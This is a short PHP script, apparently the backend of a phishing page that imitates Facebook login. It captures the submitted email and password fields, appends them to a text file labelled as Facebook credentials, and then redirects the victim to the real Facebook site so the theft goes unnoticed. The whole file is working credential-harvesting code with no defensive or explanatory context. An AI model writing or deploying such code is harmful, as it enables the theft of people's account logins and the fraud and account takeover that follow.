<?php 
file_put_contents("usuarios.txt", "  [~] Facebook User: " . $_POST['email'] . "\n  [~] Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();
?>
